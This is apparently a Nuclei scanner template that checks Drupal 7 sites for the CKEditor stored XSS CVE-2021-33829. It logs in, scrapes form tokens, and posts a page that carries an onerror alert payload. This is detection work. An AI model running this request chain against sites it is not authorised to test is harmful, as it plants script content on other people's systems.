flow: http(1) && http(2) && http(3) && http(4)
http:
- extractors:
  - internal: true
    kval:
    - set_cookie
    type: kval
  matchers:
  - condition: and
    dsl:
    - status_code == 302
    - contains(tolower(all_headers), "set-cookie")
    internal: true
    type: dsl
  raw:
  - 'POST /user/login HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded


    name={{username}}&pass={{password}}&form_id=user_login&op=Log+in

    '
- extractors:
  - group: 1
    internal: true
    name: form_build_id
    part: body
    regex:
    - name="form_build_id" value="([^"]+)"
    type: regex
  - group: 1
    internal: true
    name: form_token
    part: body
    regex:
    - name="form_token" value="([^"]+)"
    type: regex
  matchers:
  - condition: and
    dsl:
    - status_code == 200
    - contains(body, "form_build_id")
    - contains(body, "form_token")
    internal: true
    type: dsl
  raw:
  - 'GET /node/add/page HTTP/1.1

    Host: {{Hostname}}

    '
- extractors:
  - group: 1
    internal: true
    name: node_url
    part: header
    regex:
    - 'Location: (.*/node/[0-9]+)'
    type: regex
  matchers:
  - condition: and
    dsl:
    - status_code == 302
    - 'contains_all(tolower(header), "location: ","/node/")'
    internal: true
    type: dsl
  raw:
  - 'POST /node/add/page HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded


    title=XSSTest&body[und][0][value]=<!--{cke_protected}--><img src=x onerror=alert(document.domain)>&body[und][0][format]=full_html&changed=&form_build_id={{form_build_id}}&form_token={{form_token}}&form_id=page_node_form&status=1&comment=1&name={{username}}&op=Save

    '
- extractors:
  - kval:
    - node_url
    name: node_url
    type: kval
  matchers:
  - condition: and
    part: body
    type: word
    words:
    - <!--{cke_protected}-->
    - alert(document.domain)
  raw:
  - 'GET {{node_url}} HTTP/1.1

    Host: {{Hostname}}

    '
id: CVE-2021-33829
info:
  author: 0x_Akoko
  classification:
    cpe: cpe:2.3:a:ckeditor:ckeditor:*:*:*:*:*:*:*:*
    cve-id: CVE-2021-33829
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 6.1
    cwe-id: CWE-79
    epss-percentile: 0.97583
    epss-score: 0.47617
  description: 'CKEditor 4.14.0 through 4.16.x before 4.16.1 contains a reflected
    cross-site scripting caused by mishandling in comments, letting remote attackers
    inject executable JavaScript code, exploit requires victim to view malicious content.

    '
  impact: 'Attackers can execute arbitrary JavaScript in the context of the victim''s
    browser, leading to session hijacking or malicious actions.

    '
  metadata:
    max-request: 4
    shodan-query: cpe:"cpe:2.3:a:ckeditor:ckeditor"
    verified: true
  name: Drupal 7 CKEditor XSS
  reference:
  - https://checkmarx.com/blog/cve-2021-33829-stored-xss-vulnerability-discovered-in-ckeditor4-affects-widely-used-cms/
  - https://www.drupal.org/sa-core-2021-003
  - https://lists.debian.org/debian-lts-announce/2021/11/msg00007.html
  - https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/NYA354LJP47KCVJMTUO77ZCX3ZK42G3T/
  remediation: 'Update to version 4.16.1 or later.

    '
  severity: medium
  tags: cve,cve2021,drupal,ckeditor,xss,authenticated
